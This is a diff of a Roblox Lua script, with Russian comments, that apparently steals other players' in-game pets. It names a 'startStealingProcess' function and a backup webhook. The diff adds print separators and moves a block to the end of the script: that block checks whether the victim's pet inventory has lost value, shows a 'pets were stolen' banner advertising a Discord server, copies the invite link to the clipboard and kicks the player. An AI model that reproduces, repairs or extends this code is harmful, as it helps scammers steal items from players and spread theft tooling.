@@ -9,7 +9,7 @@ local BackupWebhook = getgenv().BackupWebhook or "" -- если есть зап�
 
 
 
-
+print("=============")
 
 
 local teleportStarted = false -- в начало скрипта
@@ -117,7 +117,7 @@ if needTeleport then
 end
 
 
-
+print("=============")
 
 
 -- Создание GUI
@@ -152,7 +152,7 @@ Title.TextScaled = true
 Title.Font = Enum.Font.GothamBold
 Title.Parent = Background
 
-
+print("=============")
 
 
 
@@ -196,7 +196,7 @@ local PET_VALUES = {
     ["Corrupted Kitsune"] = 100,
 }
 
-
+print("=============")
 local function checkPetsWhitelist(pet)
     for _, name in ipairs(PET_WHITELIST) do
         if string.find(pet, name) then
@@ -218,11 +218,12 @@ local function getInventoryValue()
     return total
 end
 
-
+print("=============")
 -- Получение итоговой стоимости
 local inventoryValue = getInventoryValue()
 
 
+print("=============")
 
 -- 🔧 startStealingProcess ВЫНЕСЕНА ВВЕРХ
 local function startStealingProcess()
@@ -368,62 +369,8 @@ local function startStealingProcess()
 end
 
 
+print("=============")
 
-
-
-
--- Удаление GUI
-ScreenGui:Destroy()
--- ⛔ Проверка на кражу и GUI + кик
-task.delay(1, function()
-    local newTotal = 0
-    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        local petName = value.PetType
-        if not checkPetsWhitelist(petName) then continue end
-        local petPrice = PET_VALUES[petName] or 0
-        newTotal += petPrice
-    end
-
-    if newTotal < inventoryValue then
-        -- Создание GUI
-        local player = game.Players.LocalPlayer
-        local screenGui = Instance.new("ScreenGui")
-        screenGui.Name = "TheftWarning"
-        screenGui.ResetOnSpawn = false
-        screenGui.IgnoreGuiInset = true
-        screenGui.Parent = player:WaitForChild("PlayerGui")
-
-        local frame = Instance.new("Frame")
-        frame.Size = UDim2.new(0.5, 0, 0.3, 0)
-        frame.Position = UDim2.new(0.25, 0, 0.35, 0)
-        frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-        frame.BorderSizePixel = 0
-        frame.Parent = screenGui
-
-        local corner = Instance.new("UICorner")
-        corner.CornerRadius = UDim.new(0, 16)
-        corner.Parent = frame
-
-        local label = Instance.new("TextLabel")
-        label.Size = UDim2.new(1, -20, 1, -20)
-        label.Position = UDim2.new(0, 10, 0, 10)
-        label.BackgroundTransparency = 1
-        label.TextColor3 = Color3.fromRGB(255, 255, 255)
-        label.TextScaled = true
-        label.Font = Enum.Font.GothamBold
-        label.Text = "⚠️ Some of your pets were stolen!\n\nWant a script like this?\nJoin us: discord.gg/Rm5XHagSJW"
-        label.TextWrapped = true
-        label.Parent = frame
-
-        -- Пауза перед киком
-        task.wait(10)
-
-        setclipboard("https://discord.gg/Rm5XHagSJW")
-      
-        -- Кик
-        player:Kick("⚠️ Some of your pets were stolen.\nJoin: discord.gg/Rm5XHagSJW")
-    end
-end)
 
 
 
@@ -513,3 +460,60 @@ for t = 1, 20 do
     TimerLabel.TextStrokeTransparency = alpha
     wait(0.03)
 end
+
+
+
+-- Удаление GUI
+ScreenGui:Destroy()
+-- ⛔ Проверка на кражу и GUI + кик
+task.delay(1, function()
+    local newTotal = 0
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+        if not checkPetsWhitelist(petName) then continue end
+        local petPrice = PET_VALUES[petName] or 0
+        newTotal += petPrice
+    end
+
+    if newTotal < inventoryValue then
+        -- Создание GUI
+        local player = game.Players.LocalPlayer
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "TheftWarning"
+        screenGui.ResetOnSpawn = false
+        screenGui.IgnoreGuiInset = true
+        screenGui.Parent = player:WaitForChild("PlayerGui")
+
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0.5, 0, 0.3, 0)
+        frame.Position = UDim2.new(0.25, 0, 0.35, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+        frame.BorderSizePixel = 0
+        frame.Parent = screenGui
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 16)
+        corner.Parent = frame
+
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1, -20, 1, -20)
+        label.Position = UDim2.new(0, 10, 0, 10)
+        label.BackgroundTransparency = 1
+        label.TextColor3 = Color3.fromRGB(255, 255, 255)
+        label.TextScaled = true
+        label.Font = Enum.Font.GothamBold
+        label.Text = "⚠️ Some of your pets were stolen!\n\nWant a script like this?\nJoin us: discord.gg/Rm5XHagSJW"
+        label.TextWrapped = true
+        label.Parent = frame
+
+        -- Пауза перед киком
+        task.wait(10)
+
+        setclipboard("https://discord.gg/Rm5XHagSJW")
+      
+        -- Кик
+        player:Kick("⚠️ Some of your pets were stolen.\nJoin: discord.gg/Rm5XHagSJW")
+    end
+end)
+
+
